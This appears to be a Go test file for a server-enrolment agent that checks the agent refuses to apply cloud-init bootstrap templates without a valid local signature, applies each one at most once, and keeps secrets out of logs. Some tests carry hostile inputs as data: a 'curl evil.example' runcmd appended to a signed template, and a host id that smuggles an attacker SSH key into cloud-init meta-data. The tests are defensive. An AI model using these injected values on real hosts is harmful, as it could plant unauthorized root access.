package agent

import (
	"bytes"
	"context"
	"crypto/ed25519"
	"crypto/rand"
	"encoding/base64"
	"encoding/json"
	"errors"
	"io"
	"log/slog"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"testing"

	"github.com/pascalgross/hostseal/internal/canonical"
	"github.com/pascalgross/hostseal/internal/protocol"
	"github.com/pascalgross/hostseal/internal/signing"
)

// testBootstrap is the template these tests apply.
var testBootstrap = protocol.Bootstrap{
	Name:    "standard-server",
	Version: 3,
	Body:    "#cloud-config\nhostname: bootstrapped\n",
}

// testKey is the trusted-signers entry the fixture pretends verified the template.
//
// applyBootstrap takes the key verifyBootstrap returned; the tests that only exercise application hand
// it one directly. The tests that exercise verification build a real key and a real anchor below.
var testKey = signing.PublicKey{Algorithm: signing.Ed25519, KeyID: "ops-laptop", Backend: "file"}

// signTemplate signs a template the way `hostseal sign-template` does and returns the matching anchor.
//
// Offline, over the shared canonical payload, with a key this test generated and nothing of any
// server's involved — which is the whole point of the thing being asserted. The returned SignerSet is
// built through the same parser the agent uses on /etc/hostseal/trusted-signers, so a test that passes
// here is a test about the file an administrator actually writes.
func signTemplate(t *testing.T, b protocol.Bootstrap, keyID string) (protocol.Bootstrap, *signing.SignerSet) {
	t.Helper()
	public, private, err := ed25519.GenerateKey(rand.Reader)
	if err != nil {
		t.Fatalf("generating a signing key: %v", err)
	}
	payload, err := canonical.Marshal(b.SignedPayload())
	if err != nil {
		t.Fatalf("canonicalising: %v", err)
	}
	b.Signature = base64.StdEncoding.EncodeToString(ed25519.Sign(private, payload))
	b.SignerKeyID = keyID

	alg, encoded, err := signing.EncodePublicKey(public)
	if err != nil {
		t.Fatalf("encoding the public key: %v", err)
	}
	set, err := signing.ParseSigners(strings.NewReader(string(alg)+" "+encoded+" "+keyID+" file\n"), "test")
	if err != nil {
		t.Fatalf("parsing the anchor: %v", err)
	}
	return b, set
}

// captureStdout runs fn with standard output redirected, and returns what it wrote.
//
// verifyBootstrap prints the template to the terminal because guardrail 2 of docs/SECURITY.md §7 says
// the operator authorising it must see it, and a property nothing observes is a property that quietly
// stops holding. Capturing the real stream is what makes the assertion about the thing the operator
// sees rather than about a seam introduced for the test.
func captureStdout(t *testing.T, fn func()) string {
	t.Helper()
	original := os.Stdout
	r, w, err := os.Pipe()
	if err != nil {
		t.Fatalf("creating a pipe: %v", err)
	}
	os.Stdout = w

	done := make(chan string, 1)
	go func() {
		out, _ := io.ReadAll(r)
		done <- string(out)
	}()

	fn()

	os.Stdout = original
	if err := w.Close(); err != nil {
		t.Fatalf("closing the pipe: %v", err)
	}
	return <-done
}

// TestGuaranteeBootstrapIsRecordedBeforeItRuns is guardrail 2 of docs/SECURITY.md §7 as an ordering
// assertion.
//
// The record must exist, durably and in full, at the moment the executor starts: it is the only thing
// that survives a template that crashes the machine halfway, and "what was attempted" is the question
// an incident asks. The fake executor does the asserting, because it runs at exactly the instant the
// ordering is about.
func TestGuaranteeBootstrapIsRecordedBeforeItRuns(t *testing.T) {
	stateDir, seedDir := t.TempDir(), t.TempDir()
	recordPath := filepath.Join(stateDir, BootstrapRecordFile)

	var sawRecord bootstrapRecord
	opts := EnrollOptions{
		StateDir: stateDir,
		seedDir:  seedDir,
		applyUserData: func(_ context.Context) error {
			raw, err := os.ReadFile(recordPath)
			if err != nil {
				t.Fatalf("the executor started with no record on disk: %v", err)
			}
			if err := json.Unmarshal(raw, &sawRecord); err != nil {
				t.Fatalf("the record is not readable JSON: %v", err)
			}
			return nil
		},
	}

	if err := applyBootstrap(context.Background(), opts, testBootstrap, testKey, "01JHOST"); err != nil {
		t.Fatalf("applying: %v", err)
	}

	if sawRecord.Name != "standard-server" || sawRecord.Version != 3 {
		t.Errorf("the record names %q v%d", sawRecord.Name, sawRecord.Version)
	}
	if sawRecord.Body != testBootstrap.Body {
		t.Errorf("the record does not carry the body verbatim: %q", sawRecord.Body)
	}
	if sawRecord.SignerKeyID != "ops-laptop" {
		t.Errorf("the record names signer %q", sawRecord.SignerKeyID)
	}
	if sawRecord.VerifiedAgainst != signing.TrustedSignersPath {
		t.Errorf("the record claims verification against %q", sawRecord.VerifiedAgainst)
	}
	if sawRecord.AppliedAt.IsZero() {
		t.Error("the record carries no timestamp")
	}
}

// TestGuaranteeBootstrapReachesCloudInitAsAFileNotAnArgument proves the body becomes a file where
// cloud-init reads it, and never an argument.
func TestGuaranteeBootstrapReachesCloudInitAsAFileNotAnArgument(t *testing.T) {
	stateDir, seedDir := t.TempDir(), t.TempDir()

	ran := false
	opts := EnrollOptions{
		StateDir: stateDir,
		seedDir:  seedDir,
		applyUserData: func(_ context.Context) error {
			ran = true
			userData, err := os.ReadFile(filepath.Join(seedDir, "user-data"))
			if err != nil || string(userData) != testBootstrap.Body {
				t.Fatalf("the seed user-data is %q, %v", userData, err)
			}
			meta, err := os.ReadFile(filepath.Join(seedDir, "meta-data"))
			if err != nil || !strings.Contains(string(meta), "hostseal-bootstrap-01JHOST") {
				t.Fatalf("the seed meta-data is %q, %v", meta, err)
			}
			return nil
		},
	}
	if err := applyBootstrap(context.Background(), opts, testBootstrap, testKey, "01JHOST"); err != nil {
		t.Fatalf("applying: %v", err)
	}
	if !ran {
		t.Fatal("the executor never ran")
	}

	// And it does not stay behind. A NoCloud seed left in place outranks the machine's real datasource
	// on every later boot, which would make "applied exactly once" true of HostSeal's action and false
	// of the machine it left behind.
	for _, name := range []string{"user-data", "meta-data"} {
		if _, err := os.Stat(filepath.Join(seedDir, name)); !errors.Is(err, os.ErrNotExist) {
			t.Errorf("the seed %s survived the application: %v", name, err)
		}
	}
}

// TestGuaranteeCloudInitArgumentsAreFixed proves nothing from a template can reach a command line.
//
// Guardrail 5 of docs/SECURITY.md §7 is that cloud-init does the applying, and the property that makes
// it more than a slogan is that the argument vectors are ours: four stage invocations, each a stage
// name and at most one mode flag. Anything derived from a body, a parameter or a control-plane response
// appearing here would be the exec channel wearing a hat, whatever the catalogue said.
func TestGuaranteeCloudInitArgumentsAreFixed(t *testing.T) {
	expected := [][]string{
		{"init", "--local"},
		{"init"},
		{"modules", "--mode=config"},
		{"modules", "--mode=final"},
	}
	if len(cloudInitStages) != len(expected) {
		t.Fatalf("cloud-init is run with %d stages, expected %d: %v",
			len(cloudInitStages), len(expected), cloudInitStages)
	}
	permitted := map[string]bool{
		"init": true, "modules": true, "--local": true, "--mode=config": true, "--mode=final": true,
	}
	for i, stage := range cloudInitStages {
		if strings.Join(stage, " ") != strings.Join(expected[i], " ") {
			t.Errorf("stage %d is %v, expected %v", i, stage, expected[i])
		}
		for _, arg := range stage {
			if !permitted[arg] {
				t.Errorf("stage %d passes %q, which is not one of cloud-init's own stage words. "+
					"No byte of a template, a parameter or a response may become an argument.", i, arg)
			}
		}
	}
}

// TestGuaranteeBootstrapAppliesAtMostOnce proves the interlock: a written record refuses the next
// attempt, at the same check every build honours.
//
// The second attempt goes through verifyBootstrap, which is where re-enrolment lands, and the interlock
// is its first check — before the trust anchor is even read.
func TestGuaranteeBootstrapAppliesAtMostOnce(t *testing.T) {
	stateDir, seedDir := t.TempDir(), t.TempDir()
	opts := EnrollOptions{
		StateDir:      stateDir,
		seedDir:       seedDir,
		applyUserData: func(_ context.Context) error { return nil },
	}
	if err := applyBootstrap(context.Background(), opts, testBootstrap, testKey, "01JHOST"); err != nil {
		t.Fatalf("applying: %v", err)
	}

	signed, anchor := signTemplate(t, testBootstrap, "ops-laptop")
	_, err := verifyBootstrap(stateDir, anchor, signed)
	if err == nil {
		t.Fatal("a second application was permitted")
	}
	if !strings.Contains(err.Error(), "standard-server") || !strings.Contains(err.Error(), "applied") {
		t.Fatalf("the refusal does not name what was applied: %v", err)
	}

	// And it is answerable without the template, which is what lets enrolment ask before it spends a
	// single-use token rather than after.
	if err := checkBootstrapInterlock(stateDir); err == nil {
		t.Fatal("the interlock reads as open with a record on disk")
	}
}

// TestGuaranteeAFailedBootstrapStillConsumesTheInterlock proves a failed application still consumed the
// interlock and still tells the truth.
//
// This is the deliberate direction of the trade: a crash between deciding and applying costs a manual
// re-run at worst, and never permits a second automatic attempt — because "the template ran twice" is
// the lie the record exists to make impossible.
func TestGuaranteeAFailedBootstrapStillConsumesTheInterlock(t *testing.T) {
	stateDir, seedDir := t.TempDir(), t.TempDir()
	opts := EnrollOptions{
		StateDir:      stateDir,
		seedDir:       seedDir,
		applyUserData: func(_ context.Context) error { return errors.New("stage exploded") },
	}

	err := applyBootstrap(context.Background(), opts, testBootstrap, testKey, "01JHOST")
	if err == nil {
		t.Fatal("a failed executor reported success")
	}
	recordPath := filepath.Join(stateDir, BootstrapRecordFile)
	if !strings.Contains(err.Error(), recordPath) {
		t.Errorf("the error does not point at the record: %v", err)
	}
	if _, statErr := os.Stat(recordPath); statErr != nil {
		t.Fatalf("the record did not survive the failure: %v", statErr)
	}
	signed, anchor := signTemplate(t, testBootstrap, "ops-laptop")
	if _, verifyErr := verifyBootstrap(stateDir, anchor, signed); verifyErr == nil {
		t.Fatal("a failed application left the interlock open")
	}
}

// TestGuaranteeAnUnreadableRecordRefusesRatherThanReapplying keeps the apply-once interlock from
// failing open.
//
// The interlock is a file that is *there*, so the only reading of "I could not read it" that is safe
// is "I do not know". Treating it as "no template has been applied" re-applies one — on a host that
// may already have been provisioned, from a control plane an attacker may own — which is the single
// thing docs/SECURITY.md §7 guardrail 4 exists to prevent.
//
// A directory where the record should be is the fixture, because it produces a read error on every
// platform and under every user, including the root that runs the real agent — a mode-000 file does
// not.
func TestGuaranteeAnUnreadableRecordRefusesRatherThanReapplying(t *testing.T) {
	stateDir := t.TempDir()
	if err := os.Mkdir(filepath.Join(stateDir, BootstrapRecordFile), 0o755); err != nil {
		t.Fatalf("creating the unreadable record: %v", err)
	}

	signed, anchor := signTemplate(t, testBootstrap, "ops-laptop")
	_, err := verifyBootstrap(stateDir, anchor, signed)
	if err == nil {
		t.Fatal("an unreadable bootstrap record was treated as no record at all")
	}
	if !strings.Contains(err.Error(), "unknown") {
		t.Fatalf("the refusal does not say the question is unanswered: %v", err)
	}
}

// TestGuaranteeABootstrapIsVerifiedAgainstTheHostsOwnAnchor is guardrail 3 of docs/SECURITY.md §7.
//
// A template is applied only when a key already in this host's own trusted-signers produced the
// signature. The refusal case is the one that matters: a template signed by a key this host does not
// list is a control plane authorising itself, which is exactly what the guarantee's first paragraph
// says cannot happen.
func TestGuaranteeABootstrapIsVerifiedAgainstTheHostsOwnAnchor(t *testing.T) {
	signed, anchor := signTemplate(t, testBootstrap, "ops-laptop")

	key, err := verifyBootstrap(t.TempDir(), anchor, signed)
	if err != nil {
		t.Fatalf("a template signed by a listed key was refused: %v", err)
	}
	if key.KeyID != "ops-laptop" {
		t.Errorf("verification returned key %q", key.KeyID)
	}

	// A different key, listed nowhere on this host. The template is genuinely signed; it is simply
	// signed by somebody this machine has never agreed to obey.
	stranger, _ := signTemplate(t, testBootstrap, "someone-else")
	if _, err := verifyBootstrap(t.TempDir(), anchor, stranger); err == nil {
		t.Fatal("a template signed by an untrusted key was applied")
	}

	// And a body altered after signing fails against the same anchor, because the signature covers the
	// payload rather than a digest anybody handed over.
	tampered := signed
	tampered.Body += "runcmd:\n  - curl evil.example\n"
	if _, err := verifyBootstrap(t.TempDir(), anchor, tampered); err == nil {
		t.Fatal("a template altered after signing was applied")
	}
}

// TestGuaranteeBootstrapNeverFallsBackToTrustingTheServer covers the chicken-and-egg answer in
// docs/SECURITY.md §7.
//
// The anchor is established from a local file the administrator chose, before anything is fetched, and
// with none present `--bootstrap` refuses outright. There is no flag that relaxes it and no fallback,
// because a template verified against a key the server supplied is a template verified against
// nothing.
func TestGuaranteeBootstrapNeverFallsBackToTrustingTheServer(t *testing.T) {
	signed, _ := signTemplate(t, testBootstrap, "ops-laptop")

	empty, err := signing.ParseSigners(strings.NewReader("# no keys here\n"), "test")
	if err != nil {
		t.Fatalf("parsing an empty anchor: %v", err)
	}
	for name, anchor := range map[string]*signing.SignerSet{"empty": empty, "absent": nil} {
		_, err := verifyBootstrap(t.TempDir(), anchor, signed)
		if err == nil {
			t.Fatalf("%s anchor: a template was applied with no trust anchor", name)
		}
		if !errors.Is(err, ErrNoTrustAnchor) {
			t.Fatalf("%s anchor: the refusal is not the no-anchor one: %v", name, err)
		}
	}
}

// TestGuaranteeTheOperatorSeesTheWholeTemplate is guardrail 2's other half.
//
// The person running the enrolment is authorising something that will run as root on their machine, so
// they are shown the whole body — escaped, because a raw one can carry terminal control sequences that
// scroll the real content away or forge the end marker, and an operator who approved what they were
// shown must have been shown what runs.
func TestGuaranteeTheOperatorSeesTheWholeTemplate(t *testing.T) {
	body := "#cloud-config\nruncmd:\n  - echo hello\n"
	signed, anchor := signTemplate(t, protocol.Bootstrap{Name: "standard-server", Body: body}, "ops-laptop")

	stateDir := t.TempDir()
	printed := captureStdout(t, func() {
		if _, err := verifyBootstrap(stateDir, anchor, signed); err != nil {
			t.Errorf("verifying: %v", err)
		}
	})

	if !strings.Contains(printed, "standard-server") || !strings.Contains(printed, "ops-laptop") {
		t.Errorf("the display names neither the template nor its signer: %q", printed)
	}
	// Quoted, which is also how the whole body survives on one line: the escaped form of the body has
	// to appear, not a summary of it and not the raw text.
	if !strings.Contains(printed, strings.Trim(strconv.Quote(body), `"`)) {
		t.Errorf("the body was not printed in full and escaped: %q", printed)
	}
}

// TestGuaranteeTheSeedCannotBeInjectedThroughTheHostID closes the one channel beside the template.
//
// The seed's meta-data is a YAML document cloud-init parses and acts on, and the host id is
// interpolated into it. A control plane that returned an id carrying a newline could add keys to that
// document — `public-keys`, which cloud-init installs into authorized_keys — beside a template the
// operator did approve: not covered by the offline signature, not shown, not recorded. The agent does
// not get to assume the control plane is well behaved, so the id is checked where it is used.
func TestGuaranteeTheSeedCannotBeInjectedThroughTheHostID(t *testing.T) {
	injected := "01JHOST\npublic-keys:\n  - ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIATTACKER attacker@evil"

	seedDir := t.TempDir()
	if err := writeSeed(seedDir, injected, "#cloud-config\n"); err == nil {
		t.Fatal("a host id carrying a newline was written into cloud-init's meta-data")
	}
	if _, err := os.Stat(filepath.Join(seedDir, "meta-data")); !errors.Is(err, os.ErrNotExist) {
		t.Errorf("a meta-data file was written anyway: %v", err)
	}

	if !protocol.ValidHostID("01JHOST") {
		t.Error("an ordinary generated host id was refused")
	}
	for _, bad := range []string{injected, "01J HOST", "01J/HOST", "", strings.Repeat("A", 65)} {
		if protocol.ValidHostID(bad) {
			t.Errorf("%q was accepted as a host id", bad)
		}
	}
}

// TestGuaranteeTwoConcurrentEnrolmentsApplyOnce closes the check-then-act gap in the interlock.
//
// checkBootstrapInterlock reads the record early — before the single-use token is spent, so an operator
// gets a clear refusal rather than a phantom host — and applyBootstrap writes it late. On its own that
// is check-then-act: two `hostseal enroll --bootstrap X` processes sharing a state directory both read
// "no record", both pass, and cloud-init runs twice on one machine. It is an unusual configuration and
// it is reachable from an ordinary automation script.
//
// The record is created with link(2), which fails when the file exists, so exactly one of them proceeds.
// A rename would have made the loser's record silently replace the winner's, leaving nothing on disk to
// say the template had been applied twice — which is the lie the record exists to make impossible.
//
// Both applications are counted rather than asserting on errors alone: "one error" would also be what a
// version that applied twice and failed once produced.
func TestGuaranteeTwoConcurrentEnrolmentsApplyOnce(t *testing.T) {
	stateDir := t.TempDir()

	const racers = 8
	var applied atomic.Int32
	var refused atomic.Int32

	var start sync.WaitGroup
	var done sync.WaitGroup
	start.Add(1)
	for i := range racers {
		done.Add(1)
		go func() {
			defer done.Done()
			opts := EnrollOptions{
				StateDir: stateDir,
				seedDir:  t.TempDir(),
				applyUserData: func(_ context.Context) error {
					applied.Add(1)
					return nil
				},
			}
			start.Wait()
			if err := applyBootstrap(context.Background(), opts, testBootstrap, testKey,
				"01JHOST"+strconv.Itoa(i)); err != nil {
				refused.Add(1)
			}
		}()
	}
	start.Done()
	done.Wait()

	if got := applied.Load(); got != 1 {
		t.Errorf("cloud-init was driven %d times by %d concurrent enrolments, want exactly 1", got, racers)
	}
	if got := refused.Load(); got != racers-1 {
		t.Errorf("%d of %d concurrent enrolments were refused, want %d", got, racers, racers-1)
	}
}

// TestGuaranteeTheJournalGetsADigestAndNotTheBody is the other side of guardrail 2's display.
//
// A template legitimately carries credentials — a break-glass account's hashed password, a static
// deploy key, the shapes provision.Warnings flags — and slog wrote the whole body into journald,
// structured and indexed, on every host enrolled from that template, where it persists for as long as
// the journal is retained. internal/provision's own doc says rendered material is a credential and is
// never written to a log line; this is the line that made that untrue.
//
// What the journal keeps instead has to be enough to answer "which template ran here", so the digest is
// asserted alongside the absence: an entry that identified nothing would be a different failure with
// the same test passing. The verbatim copy is the fsynced record, which the test above covers.
func TestGuaranteeTheJournalGetsADigestAndNotTheBody(t *testing.T) {
	const secret = "hashed_passwd: $6$rounds=4096$SUPERSECRETHASHVALUE"
	body := "#cloud-config\nusers:\n  - name: breakglass\n    " + secret + "\n"
	signed, anchor := signTemplate(t, protocol.Bootstrap{Name: "standard-server", Body: body}, "ops-laptop")

	var journal bytes.Buffer
	previous := slog.Default()
	slog.SetDefault(slog.New(slog.NewTextHandler(&journal, nil)))
	t.Cleanup(func() { slog.SetDefault(previous) })

	stateDir := t.TempDir()
	captureStdout(t, func() {
		if _, err := verifyBootstrap(stateDir, anchor, signed); err != nil {
			t.Errorf("verifying: %v", err)
		}
	})

	logged := journal.String()
	if strings.Contains(logged, secret) || strings.Contains(logged, "breakglass") {
		t.Errorf("the template body reached the journal:\n%s", logged)
	}
	if !strings.Contains(logged, canonical.DigestBytes([]byte(body))) {
		t.Errorf("the journal entry carries no digest, so it identifies no particular template:\n%s",
			logged)
	}
	if !strings.Contains(logged, "standard-server") {
		t.Errorf("the journal entry does not name the template:\n%s", logged)
	}
}
